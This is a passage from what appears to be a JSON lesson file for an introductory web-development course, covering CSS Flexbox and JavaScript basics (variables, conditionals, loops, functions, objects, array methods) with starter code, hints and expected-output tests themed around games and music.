arranged as a column, centering both horizontally and vertically.\n\nExpected output:\n\n~~~\n.movie-row {\n  display: flex;\n  flex-direction: row;\n  justify-content: space-between;\n  align-items: center;\n  gap: 16px;\n}\n.movie-card {\n  display: flex;\n  flex-direction: column;\n  align-items: center;\n  justify-content: center;\n}\n~~~","starter":"// Build Flexbox movie carousel rules\nfunction generateFlexLayout() {\n  // Fix the missing flex properties and alignments below\n  return `.movie-row {\n  display: block;\n  flex-direction: row;\n  gap: 16px;\n}\n.movie-card {\n  display: block;\n}`;\n}\n\nconsole.log(generateFlexLayout());\n","hint":"Set display: flex on both rules, justify-content: space-between and align-items: center on .movie-row, and flex-direction: column on .movie-card.","terms":[{"term":"Flexbox","def":"A 1-dimensional CSS layout model designed to distribute space and align items within a container."},{"term":"flex container","def":"The parent element that has ^display: flex^ enabled."},{"term":"flex item","def":"Any direct child element living inside a flex container."},{"term":"main axis","def":"The primary axis along which flex items are positioned (horizontal by default)."},{"term":"cross axis","def":"The axis perpendicular to the main axis (vertical by default)."},{"term":"justify-content","def":"A Flexbox property aligning items along the main axis."},{"term":"align-items","def":"A Flexbox property aligning items along the cross axis."}],"image":{"url":"/diagrams/web/flexbox-basics.svg","caption":"Flexbox axes: Main axis (justify-content) and Cross axis (align-items)."},"isUnitTest":false,"fileName":"index.js","tests":[{"name":"Outputs valid Flexbox carousel and card rules","input":"","expected":".movie-row {\n  display: flex;\n  flex-direction: row;\n  justify-content: space-between;\n  align-items: center;\n  gap: 16px;\n}\n.movie-card {\n  display: flex;\n  flex-direction: column;\n  align-items: center;\n  justify-content: center;\n}"}],"usesInput":false,"hasHarness":false},{"id":"unit-2-test","number":"2.4","title":"Unit 2 Test: Neon Cyberpunk Album Card","content":"## Unit 2 Capstone Challenge: Neon Cyberpunk Album Card\n\nWelcome to the Unit 2 Capstone Assessment! You have mastered CSS selectors, hex color palettes, the 4 layers of the box model, and modern Flexbox layouts.\n\nNow apply your knowledge to style a retro-futuristic synthwave album card component.\n\n## Specifications\n\nGenerate the complete CSS stylesheet defining three rules:\n\n1. **^.album-card^**:\n   - ^box-sizing: border-box;^\n   - ^width: 320px;^\n   - ^padding: 24px;^\n   - ^margin: 20px auto;^\n   - ^background-color: #0d1117;^\n   - ^border: 2px solid #00ffcc;^\n   - ^border-radius: 12px;^\n   - ^display: flex;^\n   - ^flex-direction: column;^\n   - ^align-items: center;^\n   - ^gap: 12px;^\n\n2. **^.album-card:hover^** (the hover pseudo-class):\n   - ^border-color: #ff007f;^\n   - ^box-shadow: 0 0 20px #ff007f;^\n   - ^transform: translateY(-4px);^\n\n3. **^.track-row^**:\n   - ^width: 100%;^\n   - ^display: flex;^\n   - ^justify-content: space-between;^\n   - ^align-items: center;^\n   - ^color: #e6edf3;^\n\nExpected output:\n\n~~~\n.album-card {\n  box-sizing: border-box;\n  width: 320px;\n  padding: 24px;\n  margin: 20px auto;\n  background-color: #0d1117;\n  border: 2px solid #00ffcc;\n  border-radius: 12px;\n  display: flex;\n  flex-direction: column;\n  align-items: center;\n  gap: 12px;\n}\n.album-card:hover {\n  border-color: #ff007f;\n  box-shadow: 0 0 20px #ff007f;\n  transform: translateY(-4px);\n}\n.track-row {\n  width: 100%;\n  display: flex;\n  justify-content: space-between;\n  align-items: center;\n  color: #e6edf3;\n}\n~~~","starter":"// Unit 2 Test: Neon Cyberpunk Album Card Stylesheet\nfunction generateAlbumCardStyles() {\n  // Replace this stub with the full CSS specification\n  return `/* TODO: Complete album card styles */`;\n}\n\nconsole.log(generateAlbumCardStyles());\n","hint":"Include .album-card with box-sizing, width, padding, margin, background, border, border-radius, flex layout, gap; .album-card:hover with glow effect; and .track-row with flex layout.","terms":[{"term":"pseudo-class","def":"A keyword added to a selector specifying a special interaction state, such as ^:hover^."},{"term":"box-shadow","def":"A CSS property adding drop-shadow or glowing light effects around an element frame."},{"term":"border-radius","def":"A CSS property that curves the outer corners of an element border."},{"term":"transform","def":"A CSS property enabling 2D/3D transformations like moving (^translateY^), rotating, or scaling."}],"image":{"url":"/diagrams/web/unit-2-test.svg","caption":"Neon Cyberpunk Album Card component styling specifications."},"isUnitTest":true,"fileName":"index.js","tests":[{"name":"Outputs complete neon album card stylesheet","input":"","expected":".album-card {\n  box-sizing: border-box;\n  width: 320px;\n  padding: 24px;\n  margin: 20px auto;\n  background-color: #0d1117;\n  border: 2px solid #00ffcc;\n  border-radius: 12px;\n  display: flex;\n  flex-direction: column;\n  align-items: center;\n  gap: 12px;\n}\n.album-card:hover {\n  border-color: #ff007f;\n  box-shadow: 0 0 20px #ff007f;\n  transform: translateY(-4px);\n}\n.track-row {\n  width: 100%;\n  display: flex;\n  justify-content: space-between;\n  align-items: center;\n  color: #e6edf3;\n}"}],"usesInput":false,"hasHarness":false}]},{"id":"js-essentials","title":"JavaScript Essentials - Variables & Logic","lessons":[{"id":"js-variables","number":"3.1","title":"Variables & Data Types","content":"## The Mario Vault: Storing Data in Memory\n\nHTML gives a website structure, and CSS gives it beauty, but **JavaScript** is the nervous system that brings everything alive. Without JavaScript, you cannot add items to a shopping cart, like an Instagram reel, or play browser games!\n\nAt the heart of JavaScript are **variables**. Think of a variable as a labeled storage vault in the computer's memory. When Mario runs through World 1-1, the game needs to remember his name, how many coins he has collected, how many lives he has left, and whether he has a Super Star powerup.\n\n## let vs const\n\nIn modern JavaScript, you create variables using two core keywords:\n- **^let^**: Creates a **mutable** variable whose contents can change over time (like a coin counter starting at 0 and growing to 100).\n- **^const^**: Creates an **immutable binding** that cannot be reassigned (like the player's name ^'Mario'^ or the world ^'1-1'^). Rule of thumb: always default to ^const^ unless you know the value will be updated!\n\n## The Three Fundamental Primitive Types\n\n1. **Strings**: Text wrapped in quotes, e.g. ^'Mario'^.\n2. **Numbers**: Integers or decimals used for calculations, e.g. ^42^ or ^3.14^.\n3. **Booleans**: Binary logical flags that can only ever be ^true^ or ^false^.\n\n~~~\nconst hero = 'Mario';\nlet coins = 0;\nlet isInvincible = false;\n\n// Mario picks up 5 coins!\ncoins = coins + 5;\nconsole.log('Hero:', hero);\nconsole.log('Coins:', coins);\n~~~\n\n## Predict & Observe\n\nWhat happens if you try to reassign a ^const^ variable like ^hero = 'Luigi';^? JavaScript throws a ^TypeError: Assignment to constant variable^! It guards your constants against accidental overwrites.\n\n## Your Task\n\nTrack Mario's gameplay run in World 1-1:\n1. Declare ^const playerName = 'Mario';^\n2. Declare ^const world = '1-1';^\n3. Declare ^let coins = 0;^\n4. Declare ^let lives = 3;^\n5. Declare ^let score = 0;^\n6. Declare ^const hasFireFlower = true;^\n7. Mario collects 5 coins: increase ^coins^ by 5, and increase ^score^ by 500!\n8. Print the exact status report shown below using ^console.log^.\n\nExpected output:\n\n~~~\nPlayer: Mario\nWorld: 1-1\nCoins: 5\nLives: 3\nScore: 500\nFire Power: true\n~~~","starter":"// Super Mario World Tracker\nfunction runMarioGame() {\n  // Declare the variables, collect 5 coins (+500 score), and print stats\n  const playerName = 'Mario';\n  let coins = 0;\n  // TODO: Add missing variables and updates\n\n  console.log(`Player: ${playerName}`);\n  console.log(`Coins: ${coins}`);\n}\n\nrunMarioGame();\n","hint":"Declare world, lives, score, hasFireFlower, increment coins by 5 and score by 500, then log each line.","terms":[{"term":"JavaScript","def":"The dynamic programming language that powers the interactive behavior of websites and web applications."},{"term":"variable","def":"A named memory container used to store, retrieve, and update data values."},{"term":"let","def":"A keyword used to declare variables that can be reassigned new values later."},{"term":"const","def":"A keyword used to declare constant variables whose references cannot be reassigned."},{"term":"string","def":"A sequence of characters wrapped in quotes representing textual data."},{"term":"number","def":"A numeric data type representing whole integers or decimal floating-point values."},{"term":"boolean","def":"A logical data type that holds only one of two possible values: ^true^ or ^false^."},{"term":"console.log","def":"A built-in JavaScript method that prints information to the standard output / terminal."}],"image":{"url":"/diagrams/web/js-variables.svg","caption":"JavaScript memory slots: let for mutable counters, const for fixed constants, and primitive data types."},"isUnitTest":false,"fileName":"index.js","tests":[{"name":"Prints accurate Super Mario game stats","input":"","expected":"Player: Mario\nWorld: 1-1\nCoins: 5\nLives: 3\nScore: 500\nFire Power: true"}],"usesInput":false,"hasHarness":false},{"id":"js-conditionals","number":"3.2","title":"Conditionals & Logical Operators","content":"## The Bouncer at the Arcade Door\n\nPrograms need to make decisions. Think of a conditional like a security guard standing at an arcade entrance checking passes:\n- If you have a VIP badge, walk straight into the private lounge.\n- Else if you have a regular ticket and you are at least 13 years old, enter the main gaming floor.\n- Else if you have a ticket and are under 13, go to the junior gaming zone with a guardian.\n- Otherwise (if you have no ticket at all), access is denied!\n\nIn JavaScript, we write this logic with **^if^**, **^else if^**, and **^else^**.\n\n## Comparisons & Strict Equality\n\nWhen comparing values in JavaScript, always use **strict equality (^===^)** and **strict inequality (^!==^)**. They verify that both the value AND the data type match, preventing strange bugs (like ^'0' == 0^ being true in loose equality).\n\n## Logical Operators\n\nWe combine multiple conditions using logical operators:\n- **^&&^ (Logical AND)**: Both conditions MUST be true (e.g. ^hasTicket && age >= 13^).\n- **^||^ (Logical OR)**: At least one condition must be true.\n- **^!^ (Logical NOT)**: Inverts a boolean (^!isGameOver^).\n\n~~~\nfunction checkAccess(age, hasTicket, isVIP) {\n  if (isVIP) {\n    return 'VIP Lounge';\n  } else if (hasTicket && age >= 13) {\n    return 'Main Floor';\n  } else {\n    return 'Access Denied';\n  }\n}\n~~~\n\n## Your Task\n\nWrite the ^checkArcadeAccess(age, hasTicket, isVIP)^ function:\n1. If ^isVIP^ is true: return ^'VIP Lounge: Unlimited Arcade Access + Free Snacks!'^\n2. Else if ^hasTicket^ is true and ^age >= 13^: return ^'Main Floor: All Games Unlocked'^\n3. Else if ^hasTicket^ is true and ^age < 13^: return ^'Junior Zone: Kid-friendly Arcade Games (Parent Required)'^\n4. Otherwise: return ^'Access Denied: Ticket Required at Entrance'^\n\nLog the evaluation for the four test cases specified below.\n\nExpected output:\n\n~~~\nVIP Lounge: Unlimited Arcade Access + Free Snacks!\nMain Floor: All Games Unlocked\nJunior Zone: Kid-friendly Arcade Games (Parent Required)\nAccess Denied: Ticket Required at Entrance\n~~~","starter":"// Arcade Access Clearance Checker\nfunction checkArcadeAccess(age, hasTicket, isVIP) {\n  // Implement the 4-branch conditional logic here\n  return 'Access Denied';\n}\n\nconsole.log(checkArcadeAccess(25, true, true));\nconsole.log(checkArcadeAccess(16, true, false));\nconsole.log(checkArcadeAccess(10, true, false));\nconsole.log(checkArcadeAccess(20, false, false));\n","hint":"Use if (isVIP), else if (hasTicket && age >= 13), else if (hasTicket && age < 13), and else.","terms":[{"term":"conditional","def":"A control structure executing different code blocks depending on whether a condition is true or false."},{"term":"if statement","def":"The primary conditional statement that runs a code block if its test expression evaluates to true."},{"term":"else if","def":"A secondary conditional clause checked only when the preceding if/else-if conditions evaluate to false."},{"term":"else","def":"The catch-all branch that executes if none of the preceding conditions were met."},{"term":"strict equality","def":"The ^===^ operator that checks whether two operands share both identical values and types."},{"term":"logical operator","def":"Symbols like ^&&^ (AND), ^||^ (OR), and ^!^ (NOT) that evaluate compound boolean expressions."}],"image":{"url":"/diagrams/web/js-conditionals.svg","caption":"Conditional branches: Evaluating boolean conditions to steer program execution."},"isUnitTest":false,"fileName":"index.js","tests":[{"name":"Evaluates all four arcade clearance scenarios accurately","input":"","expected":"VIP Lounge: Unlimited Arcade Access + Free Snacks!\nMain Floor: All Games Unlocked\nJunior Zone: Kid-friendly Arcade Games (Parent Required)\nAccess Denied: Ticket Required at Entrance"}],"usesInput":false,"hasHarness":false},{"id":"js-loops-arrays","number":"3.3","title":"Arrays & For Loops","content":"## The Mixtape Cassette & The Robotic Assembly Line\n\nWhat if you have 100 songs in a playlist or 50 inventory items in your Minecraft chest? You do not want 50 separate variables named ^item1^, ^item2^, ^item3^... That would be a nightmare to maintain!\n\nInstead, we use an **array**: an ordered list of values bundled inside square brackets ^[ ... ]^.\n\n## Zero-Indexed Memory\n\nArrays are **zero-indexed**. The very first item is stored at index ^0^, the second at index ^1^, and so on. You access an item by putting its index inside brackets: ^songs[0]^. The total count of items is always given by the **^.length^** property.\n\n## The Tireless for Loop\n\nA **^for^ loop** is a tireless robotic worker that visits each slot of the array in sequence:\n\n~~~\nconst songs = ['Cruel Summer', 'Style', 'Karma'];\n\nfor (let i = 0; i < songs.length; i++) {\n  console.log(`Track ${i + 1}: ${songs[i]}`);\n}\n~~~\n\n- ^let i = 0^: Start the loop counter at the first index (0).\n- ^i < songs.length^: Keep running as long as ^i^ is within the array bounds.\n- ^i++^: Increment ^i^ by 1 after each loop cycle.\n\nYou can append new items to the end of any array using the **^.push()^** method!\n\n## Your Task\n\nA spacecraft's power bank has battery cells with varying charge percentages: ^[85, 40, 100, 15, 90, 30]^.\n1. Create an empty array ^activeCells = []^ and a variable ^totalPower = 0^.\n2. Loop through all cells using a standard ^for^ loop.\n3. For every cell with a charge of at least 50% (^charge >= 50^):\n   - Add it to ^activeCells^ using ^.push(charge)^\n   - Add its charge to ^totalPower^\n4. Print the final inventory report shown below.\n\nExpected output:\n\n~~~\nActive Cells: 3\nActive Cell Charges: 85, 100, 90\nTotal Power Output: 275%\n~~~","starter":"// Spacecraft Power Cell Inventory\nfunction processPowerCells() {\n  const powerCells = [85, 40, 100, 15, 90, 30];\n  const activeCells = [];\n  let totalPower = 0;\n\n  // TODO: Write a for loop iterating through powerCells\n  // Filter cells >= 50, push to activeCells, and sum totalPower\n\n  console.log(`Active Cells: ${activeCells.length}`);\n  console.log(`Active Cell Charges: ${activeCells.join(', ')}`);\n  console.log(`Total Power Output: ${totalPower}%`);\n}\n\nprocessPowerCells();\n","hint":"Loop from i = 0 to i < powerCells.length. If powerCells[i] >= 50, push to activeCells and add to totalPower.","terms":[{"term":"array","def":"An ordered list of values stored within a single variable using square brackets ^[]^."},{"term":"index","def":"The numeric position of an element in an array, starting at index 0."},{"term":"zero-indexed","def":"The programming convention where list indexing begins with 0 rather than 1."},{"term":"length","def":"An array property returning the total number of elements currently stored in the array."},{"term":"push","def":"A built-in array method that appends one or more items to the end of the array."},{"term":"for loop","def":"A control loop repeating a code block while a condition holds true, using an incrementing counter."},{"term":"iteration","def":"A single complete execution cycle through a loop body."}],"image":{"url":"/diagrams/web/js-loops-arrays.svg","caption":"Array indexing [0, 1, 2] and the for loop iterator iterating across items."},"isUnitTest":false,"fileName":"index.js","tests":[{"name":"Filters active cells and sums total power","input":"","expected":"Active Cells: 3\nActive Cell Charges: 85, 100, 90\nTotal Power Output: 275%"}],"usesInput":false,"hasHarness":false},{"id":"unit-3-test","number":"3.4","title":"Unit 3 Test: Spotify Playlist Queue Filter & Duration Calculator","content":"## Unit 3 Capstone Challenge: Spotify Playlist Queue Engine\n\nWelcome to the Unit 3 Capstone Assessment! You have mastered JavaScript variables, data types, conditional branching, array indexing, and loop accumulators.\n\nNow build the core queue and duration engine for a music streaming service like Spotify.\n\n## Specifications\n\nYou are given an array of song objects:\n\n~~~javascript\nconst playlist = [\n  { title: 'Cruel Summer', duration: 178, skipped: false },\n  { title: 'Anti-Hero', duration: 200, skipped: false },\n  { title: 'Interlude', duration: 45, skipped: true },\n  { title: 'Karma', duration: 184, skipped: false },\n  { title: 'Bad Blood Remix', duration: 212, skipped: true },\n  { title: 'Blank Space', duration: 231, skipped: false }\n];\n~~~\n\nWrite the logic to:\n1. Loop through all songs in ^playlist^.\n2. For each song where ^skipped === false^:\n   - Print: ^Playing: <title> (<duration>s)^\n   - Count this as an active track\n   - Add its duration to an accumulator ^totalSeconds^\n3. Convert ^totalSeconds^ into minutes and seconds:\n   - ^minutes = Math.floor(totalSeconds / 60)^\n   - ^remainingSeconds = totalSeconds % 60^ (using the modulo operator!)\n4. Print the final summary lines:\n   - ^Active Tracks: <activeCount> / <totalTracks>^\n   - ^Total Queue Duration: <minutes>m <remainingSeconds>s^\n   - ^Status: Queue Ready for Playback^\n\nExpected output:\n\n~~~\nPlaying: Cruel Summer (178s)\nPlaying: Anti-Hero (200s)\nPlaying: Karma (184s)\nPlaying: Blank Space (231s)\nActive Tracks: 4 / 6\nTotal Queue Duration: 13m 13s\nStatus: Queue Ready for Playback\n~~~","starter":"// Unit 3 Test: Spotify Playlist Queue Engine\nfunction runPlaylistQueue() {\n  const playlist = [\n    { title: 'Cruel Summer', duration: 178, skipped: false },\n    { title: 'Anti-Hero', duration: 200, skipped: false },\n    { title: 'Interlude', duration: 45, skipped: true },\n    { title: 'Karma', duration: 184, skipped: false },\n    { title: 'Bad Blood Remix', duration: 212, skipped: true },\n    { title: 'Blank Space', duration: 231, skipped: false }\n  ];\n\n  // TODO: Iterate through playlist, filter active tracks, calculate duration, and print output\n}\n\nrunPlaylistQueue();\n","hint":"Filter on !track.skipped, accumulate totalSeconds, use Math.floor(totalSeconds / 60) for minutes, and totalSeconds % 60 for seconds.","terms":[{"term":"accumulator","def":"A variable initialized before a loop that continually aggregates data across iterations."},{"term":"modulo","def":"The remainder operator (%), computing the remaining value after integer division."},{"term":"queue","def":"A data sequence where items are arranged to be processed in order."}],"image":{"url":"/diagrams/web/unit-3-test.svg","caption":"Music Queue Pipeline: filtering skipped tracks, calculating total minutes and seconds, and reporting summary."},"isUnitTest":true,"fileName":"index.js","tests":[{"name":"Processes playlist queue, filters tracks, and formats duration","input":"","expected":"Playing: Cruel Summer (178s)\nPlaying: Anti-Hero (200s)\nPlaying: Karma (184s)\nPlaying: Blank Space (231s)\nActive Tracks: 4 / 6\nTotal Queue Duration: 13m 13s\nStatus: Queue Ready for Playback"}],"usesInput":false,"hasHarness":false}]},{"id":"js-functions-objects","title":"JavaScript Functions & Objects","lessons":[{"id":"js-functions","number":"4.1","title":"Functions & Arrow Syntax","content":"## The Reusable Spell Machine (Espresso Maker)\n\nImagine you run a bustling coffee shop. You would not invent a brand new way to brew coffee for every single customer who walks through the door! You have an espresso machine: you supply beans and milk (the **parameters** / **arguments**), the machine runs its brewing recipe, and it hands back a fresh latte (the **return value**).\n\nIn programming, that reusable machine is called a **function**.\n\n## Declaring Functions vs Arrow Functions\n\nThere are two primary ways to author functions in modern JavaScript:\n\n1. **Standard Function Declaration**:\n   ~~~\n   function calculateBaseDamage(spellPower, intelligence) {\n     return spellPower + (intelligence * 1.5);\n   }\n   ~~~\n2. **Modern Arrow Function (^() =>^)**:\n   A sleek, concise shorthand popular in modern codebases:\n   ~~~\n   const applyCrit = (damage, critRate) => damage * critRate;\n   ~~~\n\n## Parameters vs Return Values\n\n- **Parameters**: The variable placeholders declared in the parentheses (e.g. ^spellPower, intelligence^).\n- **Arguments**: The real values passed in during an actual call (e.g. ^calculateBaseDamage(80, 20)^).\n- **^return^**: The crucial statement that stops the function and sends the computed result back out into your code. Without ^return^, a function yields ^undefined^!\n\n## Your Task\n\nBuild a wizard combat calculation module:\n1. Declare a standard function ^calculateBaseDamage(spellPower, intelligence)^ that returns ^spellPower + (intelligence * 1.5)^.\n2. Declare an arrow function ^applyCrit = (damage, critRate) => damage * critRate^.\n3. Compute ^base = calculateBaseDamage(80, 20)^.\n4. Compute ^total = applyCrit(base, 2.0)^.\n5. Print the two lines shown below.\n\nExpected output:\n\n~~~\nBase Spell Damage: 110\nCritical Spell Hit: 220\n~~~","starter":"// Wizard Spell Combat Calculator\nfunction combatEngine() {\n  // TODO: Define calculateBaseDamage(spellPower, intelligence)\n  // TODO: Define arrow function applyCrit(damage, critRate)\n\n  const base = 0;\n  const total = 0;\n\n  console.log(`Base Spell Damage: ${base}`);\n  console.log(`Critical Spell Hit: ${total}`);\n}\n\ncombatEngine();\n","hint":"Return spellPower + (intelligence * 1.5) from calculateBaseDamage, and return damage * critRate from applyCrit.","terms":[{"term":"function","def":"A named, reusable block of instructions that performs a computation and can return a value."},{"term":"parameter","def":"A named placeholder variable defined in a function signature for receiving input values."},{"term":"argument","def":"The actual value passed into a function when it is invoked."},{"term":"return","def":"A keyword terminating function execution and passing a value back to the function caller."},{"term":"arrow function","def":"A compact syntax for writing JavaScript functions using the ^=>^ symbol."},{"term":"scope","def":"The context determining where variables are declared, accessible, or hidden."}],"image":{"url":"/diagrams/web/js-functions.svg","caption":"Function machines: Parameters as inputs, logic body, and return value output."},"isUnitTest":false,"fileName":"index.js","tests":[{"name":"Computes base damage and critical multiplier with functions","input":"","expected":"Base Spell Damage: 110\nCritical Spell Hit: 220"}],"usesInput":false,"hasHarness":false},{"id":"js-objects","number":"4.2","title":"Objects & Methods","content":"## The RPG Character Sheet & Pokémon Card\n\nAn array is great for an ordered list of identical things (like high scores). But what if you want to describe a rich, multifaceted entity, like a Pokémon or an RPG superhero?\n\nA single character has a name, a type, hit points, attack power, and special abilities. In JavaScript, we group these related traits into an **object** using curly braces ^{ ... }^ and **key-value pairs**.\n\n~~~\nconst pikachu = {\n  name: 'Pikachu',\n  type: 'Electric',\n  hp: 100\n};\n~~~\n\n## Reading Data: Dot Notation vs Bracket Notation\n\nYou can read properties in two ways:\n1. **Dot notation** (most common): ^pikachu.hp^\n2. **Bracket notation** (ideal when the key name is stored in another variable): ^pikachu['type']^\n\n## Objects That Take Action: Methods\n\nWhen an object has a property that is a function, we call it a **method**. Inside a method, the special keyword **^this^** refers to the object itself!\n\n~~~\nconst pikachu = {\n  name: 'Pikachu',\n  hp: 100,\n  takeDamage(amount) {\n    this.hp -= amount;\n  }\n};\n~~~\n\n## Your Task\n\nConstruct the ^pikachu^ object with:\n- ^name: 'Pikachu'^\n- ^type: 'Electric'^\n- ^level: 25^\n- ^hp: 100^\n- ^maxHp: 100^\n- Method ^takeDamage(amount)^: decrements ^this.hp^ by ^amount^ (not falling below 0 using ^Math.max(0, ...)^) and returns ^\"<name> took <amount> damage! Current HP: <hp>/<maxHp>\"^\n- Method ^heal(amount)^: increments ^this.hp^ by ^amount^ (not exceeding ^maxHp^ using ^Math.min(this.maxHp, ...)^) and returns ^\"<name> restored <amount> HP! Current HP: <hp>/<maxHp>\"^\n\nRun the battle simulation below and print the combat logs.\n\nExpected output:\n\n~~~\nPokemon: Pikachu (Lv. 25)\nPrimary Type: Electric\nPikachu took 35 damage! Current HP: 65/100\nPikachu restored 20 HP! Current HP: 85/100\n~~~","starter":"// Pokemon Battle Simulation\nfunction runPokemonBattle() {\n  const pikachu = {\n    name: 'Pikachu',\n    type: 'Electric',\n    level: 25,\n    hp: 100,\n    maxHp: 100,\n    takeDamage(amount) {\n      // TODO: Decrement hp and return status string\n      return '';\n    },\n    heal(amount) {\n      // TODO: Increment hp and return status string\n      return '';\n    }\n  };\n\n  console.log(`Pokemon: ${pikachu.name} (Lv. ${pikachu.level})`);\n  console.log(`Primary Type: ${pikachu['type']}`);\n  console.log(pikachu.takeDamage(35));\n  console.log(pikachu.heal(20));\n}\n\nrunPokemonBattle();\n","hint":"In takeDamage: this.hp = Math.max(0, this.hp - amount). In heal: this.hp = Math.min(this.maxHp, this.hp + amount). Return the formatted status strings.","terms":[{"term":"object","def":"A standalone data structure grouping related properties and methods into key-value pairs."},{"term":"key-value pair","def":"A named identifier (key) associated with its data value inside an object."},{"term":"property","def":"A named data attribute belonging to an object, like ^pikachu.level^."},{"term":"method","def":"A function defined as a property of an object that can interact with the object’s internal state."},{"term":"dot notation","def":"Accessing an object property using a period, such as ^hero.health^."},{"term":"bracket notation","def":"Accessing an object property using square brackets and strings, such as ^hero[\"health\"]^."},{"term":"this","def":"A context keyword in JavaScript referring to the object currently executing the method."}],"image":{"url":"/diagrams/web/js-objects.svg","caption":"Object character sheets: Key-value properties and callable object methods."},"isUnitTest":false,"fileName":"index.js","tests":[{"name":"Executes Pokemon battle methods and logs status transitions","input":"","expected":"Pokemon: Pikachu (Lv. 25)\nPrimary Type: Electric\nPikachu took 35 damage! Current HP: 65/100\nPikachu restored 20 HP! Current HP: 85/100"}],"usesInput":false,"hasHarness":false},{"id":"js-array-methods","number":"4.3","title":"Modern Array Methods: map, filter & reduce","content":"## The Supercharged Assembly Line: map, filter & reduce\n\nTraditional ^for^ loops get the job done, but modern JavaScript developers prefer expressive, declarative superpowers known as **higher-order array methods**.\n\nMeet the Big Three:\n\n1. **^.filter(callback)^**:\n   The VIP bouncer. It inspects every element in the array. If the callback returns ^true^, the item is kept; if ^false^, it is discarded. The original array remains untouched!\n   ~~~\n   const qualifiers = scores.filter(s => s >= 100);\n   ~~~\n\n2. **^.map(callback)^**:\n   The transformation spell. It takes every item, applies a function to it, and returns a new array with the transformed items. Think of it like putting sunglasses on everyone in a group photo.\n   ~~~\n   const boosted = qualifiers.map(s => s * 1.10);\n   ~~~\n\n3. **^.reduce(callback, initialValue)^**:\n   The cash register receipt. It crunches an entire array down to a single value (such as a total sum, average, or single composite object).\n   ~~~\n   const total = boosted.reduce((sum, s) => sum + s, 0);\n   ~~~\n\n## Why Immutability Matters\n\nNotice that none of these methods modify the original array! They return fresh copies, which prevents subtle bugs in complex web applications.\n\n## Your Task\n\nProcess a roster of esports tournament scores: ^[45, 120, 80, 250, 95, 310]^:\n1. Use **^.filter()^** to keep only scores ^>= 100^.\n2. Use **^.map()^** on the qualifiers to apply a 10% bonus (^Math.round(score * 1.10)^).\n3. Use **^.reduce()^** to sum all boosted scores starting from 0.\n4. Print the three summary lines shown below.\n\nExpected output:\n\n~~~\nQualifying Scores: 120, 250, 310\nBoosted Scores: 132, 275, 341\nTotal Prize Pool Points: 748\n~~~","starter":"// Esports Tournament Score Pipeline\nfunction processTournamentScores() {\n  const scores = [45, 120, 80, 250, 95, 310];\n\n  // 1. Filter scores >= 100\n  const highScores = [];\n\n  // 2. Map highScores applying 10% bonus: Math.round(score * 1.10)\n  const boostedScores = [];\n\n  // 3. Reduce boostedScores to calculate sum starting at 0\n  const totalPrizePool = 0;\n\n  console.log(`Qualifying Scores: ${highScores.join(', ')}`);\n  console.log(`Boosted Scores: ${boostedScores.join(', ')}`);\n  console.log(`Total Prize Pool Points: ${totalPrizePool}`);\n}\n\nprocessTournamentScores();\n","hint":"Use scores.filter(s => s >= 100), highScores.map(s => Math.round(s * 1.10)), and boostedScores.reduce((acc, s) => acc + s, 0).","terms":[{"term":"callback function","def":"A function supplied as an argument to another function, to be called when needed."},{"term":"higher-order function","def":"A function that accepts other functions as arguments or returns a function."},{"term":"filter","def":"An array method creating a new array containing all elements passing a test condition."},{"term":"map","def":"An array method creating a new array containing the results of transforming each element."},{"term":"reduce","def":"An array method iterating across all items to reduce them into a single aggregate result."}],"image":{"url":"/diagrams/web/js-array-methods.svg","caption":"The Modern Pipeline: .filter() selects, .map() transforms, and .reduce() aggregates."},"isUnitTest":false,"fileName":"index.js","tests":[{"name":"Executes filter, map, and reduce pipeline correctly","input":"","expected":"Qualifying Scores: 120, 250, 310\nBoosted Scores: 132, 275, 341\nTotal Prize Pool Points: 748"}],"usesInput":false,"hasHarness":false},{"id":"unit-4-test","number":"4.4","title":"Unit 4 Test: Video Game Inventory & Stat Powerup Engine","content":"## Unit 4 Capstone Challenge: RPG Inventory Engine\n\nWelcome to the Unit 4 Capstone Assessment! You have unlocked functions, arrow syntax, objects, methods, and higher-order array pipelines (^.filter^, ^.map^, ^.reduce^).\n\nNow build an automated equipment scoring and enchantment pipeline for an RPG video game.\n\n## Specifications\n\nYou are given a player's inventory bag:\n\n~~~javascript\nconst inventory = [\n  { name: 'Rusty Dagger', type: 'weapon', rarity: 'common', power: 15 },\n  { name: 'Excalibur', type: 'weapon', rarity: 'legendary', power: 250 },\n  { name: 'Leather Boots', type: 'armor', rarity: 'common', power: 10 },\n  { name: 'Dragon Plate Armor', type: 'armor', rarity: 'legendary', power: 180 },\n  { name: 'Healing Potion', type: 'consumable', rarity: 'rare', power: 50 },\n  { name: 'Infinity Gauntlet', type: 'artifact', rarity: 'legendary', power: 500 }\n];\n~~~\n\nBuild the data pipeline:\n1. **Filter**: Select only items where ^rarity === 'legendary'^.\n2. **Map**: Transform each legendary item into a new object carrying a ^buffedPower^ property calculated as ^Math.floor(item.power * 1.25)^ (enchantment boost!).\n3. **Reduce**: Sum all ^buffedPower^ values to calculate the ^totalGearScore^.\n4. **Log**: Print the full battle readiness report:\n   - ^Legendary Items Found: <count>^\n   - ^Buffed Gear Roster:^\n   - For each buffed item: ^- <name>: <buffedPower> power^\n   - ^Total Player Gear Score: <totalGearScore>^\n   - ^Battle Readiness: RAID READY^\n\nExpected output:\n\n~~~\nLegendary Items Found: 3\nBuffed Gear Roster:\n- Excalibur: 312 power\n- Dragon Plate Armor: 225 power\n- Infinity Gauntlet: 625 power\nTotal Player Gear Score: 1162\nBattle Readiness: RAID READY\n~~~","starter":"// Unit 4 Test: RPG Equipment Scoring Engine\nfunction runInventoryEngine() {\n  const inventory = [\n    { name: 'Rusty Dagger', type: 'weapon', rarity: 'common', power: 15 },\n    { name: 'Excalibur', type: 'weapon', rarity: 'legendary', power: 250 },\n    { name: 'Leather Boots', type: 'armor', rarity: 'common', power: 10 },\n    { name: 'Dragon Plate Armor', type: 'armor', rarity: 'legendary', power: 180 },\n    { name: 'Healing Potion', type: 'consumable', rarity: 'rare', power: 50 },\n    { name: 'Infinity Gauntlet', type: 'artifact', rarity: 'legendary', power: 500 }\n  ];\n\n  // TODO: Use filter, map, and reduce to compute the required gear report\n}\n\nrunInventoryEngine();\n","hint":"Filter on item.rarity === \"legendary\", map with buffedPower: Math.floor(item.power * 1.25), and reduce to sum buffedPower.","terms":[{"term":"gear score","def":"A composite numerical index reflecting the collective power level of equipped gear."},{"term":"data transformation","def":"The process of taking raw structured data and converting it into a clean enriched format."},{"term":"pipeline","def":"A chained sequence of operations where the output of each function feeds into the next."}],"image":{"url":"/diagrams/web/unit-4-test.svg","caption":"RPG Inventory Pipeline: filtering legendary gear, applying potion multipliers, and computing total gear score."},"isUnitTest":true,"fileName":"index.js","tests":[{"name":"Computes legendary gear buffs and 